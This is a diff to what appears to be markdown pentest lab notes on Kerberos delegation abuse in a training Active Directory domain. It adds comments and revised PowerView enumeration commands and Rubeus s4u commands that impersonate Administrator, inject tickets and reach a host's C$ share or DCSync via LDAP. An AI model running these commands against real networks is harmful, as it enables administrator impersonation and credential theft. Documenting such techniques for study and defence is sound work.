@@ -14,6 +14,9 @@ The TGT will be stored in the LSASS process.
 {% tab title="PowerView" %}
 ```powershell
 Get-DomainComputer -UnConstrained
+
+# filter the result:
+Get-DomainComputer -Unconstrained | select -ExpandProperty name
 ```
 {% endtab %}
 
@@ -74,7 +77,10 @@ in order to create a more restrictive delegation mechanism, Microsoft develop tw
 {% tabs %}
 {% tab title="PowerView" %}
 ```powershell
+# enumerate users with constrained delegation
 Get-DomainUser -TrustedToAuth
+
+# enumerate the computer accounts with constrained delegation enabled
 Get-DomainComputer -TrustedToAuth
 ```
 {% endtab %}
@@ -90,17 +96,20 @@ Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-All
 
 {% code overflow="wrap" %}
 ```powershell
-Rubeus.exe s4u /user:websvc /aes256:<aes256_key> /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.local /ptt
+Rubeus.exe  -args s4u /user:websvc /aes256:<aes256_key> /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /ptt
+
+# Check if the TGS is injected:
+klist
 
 # You can change the target service in the ticket
-Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:<aes256_key> /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt
+Rubeus.exe -args s4u /user:dcorp-adminsrv$ /aes256:<aes256_key> /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt
 ```
 {% endcode %}
 
-Check if worked
+Try accessing filesystem on dcorp-mssql:
 
 ```powershell
-ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$ 
+dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$ 
 ```
 
 Or dcsync if you have changed the service to LDAP.
